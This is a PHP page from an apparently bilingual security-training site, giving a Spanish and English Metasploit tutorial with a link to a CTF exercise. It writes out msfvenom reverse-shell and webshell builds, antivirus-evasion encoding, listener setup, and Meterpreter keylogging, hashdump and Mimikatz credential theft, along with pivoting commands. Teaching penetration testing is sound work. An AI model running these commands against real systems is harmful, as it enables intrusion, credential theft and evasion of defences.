<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Metasploit Framework: Explotación Avanzada — CyberEscudo' : 'Metasploit Framework: Advanced Exploitation — CyberEscudo';
$contentTitle = $lang==='es' ? 'Metasploit Framework: Explotación y Post-Explotación' : 'Metasploit Framework: Exploitation & Post-Exploitation';
$contentDate  = '2022-03-10';
$contentDiff  = 'advanced';
$contentTags  = ['Metasploit','Exploitation','Meterpreter','Msfvenom','Pivoting'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p><strong>Metasploit Framework (MSF)</strong> es la plataforma de explotación más utilizada en ciberseguridad ofensiva. Permite desarrollar, probar y ejecutar exploits contra sistemas objetivo. Más allá de lanzar exploits públicos, su verdadero poder reside en el manejo de sesiones y el enrutamiento de red (Pivoting).</p>

  <h2>1. Gestión de Base de Datos y Workspaces</h2>
  <p>Trabajar con la base de datos de Metasploit es vital en auditorías grandes para no perder el rastro de hosts, servicios y credenciales extraídas.</p>
  <pre><code># Iniciar la base de datos PostgreSQL en Linux:
systemctl start postgresql
msfdb init

# Dentro de msfconsole:
db_status                # Verificar que estamos conectados
workspace -a EmpresaX    # Crear un espacio de trabajo aislado
workspace EmpresaX       # Cambiar a ese espacio

# Ejecutar Nmap y guardar resultados directamente en la DB de Metasploit:
db_nmap -sV -p- 192.168.1.50

# Ver los datos recopilados:
hosts                    # Ver todos los equipos descubiertos
services                 # Ver todos los puertos abiertos
creds                    # Ver contraseñas y hashes robados
vulns                    # Ver vulnerabilidades identificadas</code></pre>

  <h2>2. El concepto vital: Payloads Staged vs Stageless</h2>
  <p>Un error de novato es no entender cómo viaja el payload al servidor comprometido.</p>
  <ul>
      <li><strong>Staged Payload (Con etapas):</strong> Ej: <code>windows/x64/meterpreter/reverse_tcp</code> (Fíjate en las barras <code>/</code>). Envía un trozo de código minúsculo (el <em>stager</em>) a la víctima. Este stager se conecta a ti y descarga el resto de Meterpreter en la memoria. Ocupa menos espacio, ideal para exploits de desbordamiento de búfer (Buffer Overflow).</li>
      <li><strong>Stageless Payload (Sin etapas):</strong> Ej: <code>windows/x64/meterpreter_reverse_tcp</code> (Fíjate en el guion bajo <code>_</code>). El ejecutable contiene TODO Meterpreter. Es más grande, pero <strong>es más estable y evade mejor algunos firewalls</strong> porque no requiere una segunda conexión de descarga.</li>
  </ul>

  <!-- ─── SECCIÓN DEL RETO CTF 21 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Simulador Msfvenom Crafter
      </h3>
      <p style="margin-bottom: 1.5rem;">Te enfrentas a un firewall corporativo que corta las conexiones en dos fases. Necesitas generar un <strong>Payload Stageless</strong> (sin etapas) para un sistema Windows de 64 bits. Construye el comando de <strong>msfvenom</strong> exacto para asegurar tu shell inicial.</p>
      <a href="/ctf/ctf-21.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 21
      </a>
  </div>

  <h2>3. Creación de Payloads con msfvenom</h2>
  <pre><code># Payload Windows EXE (Stageless - Más fiable):
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o update.exe

# Payload Linux ELF (Staged):
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f elf -o linux_shell

# Payload PHP (Webshell):
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f raw -o shell.php

# Uso de Encoders para evasión de Antivirus (Ej: Shikata_ga_nai, 3 iteraciones):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe</code></pre>

  <h2>4. Configuración del Handler (El Listener)</h2>
  <p>Si envías un payload generado por msfvenom a una víctima, necesitas que Metasploit esté escuchando correctamente para atrapar la sesión cuando la víctima lo ejecute.</p>
  <pre><code>msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j     # -j ejecuta el listener en segundo plano</code></pre>

  <h2>5. Meterpreter — Post-Explotación Avanzada</h2>
  <p>Una vez consigues la codiciada sesión <code>meterpreter ></code>, estás dentro de la máquina. Las acciones típicas incluyen escalar privilegios, robar hashes y borrar tus huellas.</p>
  <pre><code># Información del sistema y procesos:
sysinfo
getuid                 # Ver qué usuario somos (Queremos ser NT AUTHORITY\SYSTEM)
ps                     # Listar procesos
migrate 1432           # Migrar nuestro payload al proceso de Explorer.exe para no perder la shell

# Interacción del sistema:
shell                  # Soltar a una CMD/Bash nativa del sistema operativo
upload /local/file.exe C:\\Windows\\Temp\\
download C:\\Users\\Admin\\passwords.txt /tmp/

# Espionaje:
screenshot
keyscan_start          # Iniciar keylogger
keyscan_dump           # Volcar contraseñas tecleadas

# Robo de credenciales (Requiere privilegios SYSTEM):
hashdump               # Extrae el archivo SAM (Contraseñas hasheadas de Windows)
load kiwi              # Carga Mimikatz directamente en memoria
creds_all              # Ejecuta Mimikatz para robar contraseñas en texto claro de la RAM</code></pre>

  <h2>6. Pivoting (Enrutamiento de Red)</h2>
  <p>Si comprometes el <code>Servidor A (192.168.1.10)</code>, y descubres que tiene una segunda tarjeta de red conectada a una base de datos interna <code>(10.0.0.5)</code>, tú (el atacante) no puedes llegar a la <code>10.0.0.5</code>. Debes usar Metasploit para enrutar tu tráfico a través de la sesión de Meterpreter del Servidor A.</p>
  <pre><code># 1. Enviar Meterpreter al background (ctrl + z)
meterpreter > background

# 2. Configurar la ruta para que todo el tráfico a la red 10.X.X.X pase por la sesión 1:
msf6 > route add 10.0.0.0/24 1

# 3. Escanear la red interna desde Metasploit (usando la máquina comprometida como puente):
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.0.0.5
msf6 > run

# 4. Exponer un puerto interno al exterior (Port Forwarding):
# Traer el puerto 3306 de la víctima interna a tu propio puerto local 13306
meterpreter > portfwd add -l 13306 -p 3306 -r 10.0.0.5</code></pre>
</div>

<?php else: ?>
<div class="prose">
  <p><strong>Metasploit Framework (MSF)</strong> is the most widely used offensive security exploitation platform. Beyond launching public exploits, its true power lies in session management, payload crafting, and network routing (Pivoting).</p>

  <h2>1. Database and Workspace Management</h2>
  <pre><code># Start PostgreSQL in Linux:
systemctl start postgresql
msfdb init

# Inside msfconsole:
db_status                # Verify connection
workspace -a CorpX       # Create an isolated workspace
workspace CorpX          # Switch to it

# Run Nmap and save results directly to MSF DB:
db_nmap -sV -p- 192.168.1.50

# View gathered intelligence:
hosts | services | creds | vulns</code></pre>

  <h2>2. The Core Concept: Staged vs Stageless Payloads</h2>
  <ul>
      <li><strong>Staged Payload:</strong> E.g. <code>windows/x64/meterpreter/reverse_tcp</code> (Notice the <code>/</code>). Sends a tiny stager that connects back to you to download the rest of Meterpreter into memory. Ideal for Buffer Overflows with tight space.</li>
      <li><strong>Stageless Payload:</strong> E.g. <code>windows/x64/meterpreter_reverse_tcp</code> (Notice the <code>_</code>). Contains the entire Meterpreter binary. Larger, but <strong>more stable and evades firewalls better</strong> because it doesn't drop the connection to download a second stage.</li>
  </ul>

  <!-- ─── SECCIÓN DEL RETO CTF 21 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Msfvenom Crafter Simulator
      </h3>
      <p style="margin-bottom: 1.5rem;">You are facing a corporate firewall that drops two-stage connections. You need to generate a <strong>Stageless Payload</strong> for a 64-bit Windows system. Construct the exact <strong>msfvenom</strong> command to secure your initial shell.</p>
      <a href="/ctf/ctf-21.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 21 CHALLENGE
      </a>
  </div>

  <h2>3. Creating Payloads with msfvenom</h2>
  <pre><code># Windows EXE Payload (Stageless - Reliable):
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o update.exe

# Linux ELF Payload (Staged):
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f elf -o linux_shell

# Using Encoders for AV Evasion (Shikata_ga_nai, 3 iterations):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe</code></pre>

  <h2>4. Listener Setup (multi/handler)</h2>
  <pre><code>msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 > set LHOST 10.10.14.50
msf6 > set LPORT 4444
msf6 > exploit -j     # -j runs listener in the background</code></pre>

  <h2>5. Meterpreter — Advanced Post-Exploitation</h2>
  <pre><code>sysinfo
getuid                 # Check privileges (Target: NT AUTHORITY\SYSTEM)
migrate 1432           # Migrate payload to Explorer.exe memory space

shell                  # Drop to native OS shell
upload /local/file.exe C:\Windows\Temp\
keyscan_start          # Start keylogger

hashdump               # Extract Windows SAM hashes (Requires SYSTEM)
load kiwi              # Load Mimikatz into memory
creds_all              # Run Mimikatz to steal cleartext RAM passwords</code></pre>

  <h2>6. Pivoting (Network Routing)</h2>
  <p>If you compromise Server A and discover it has access to an internal isolated DB, you must route your Metasploit traffic through Server A's session.</p>
  <pre><code># 1. Background the Meterpreter session:
meterpreter > background

# 2. Route all traffic to the 10.x.x.x network through session 1:
msf6 > route add 10.0.0.0/24 1

# 3. Port Forwarding (Bring internal port 3306 to local port 13306):
meterpreter > portfwd add -l 13306 -p 3306 -r 10.0.0.5</code></pre>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';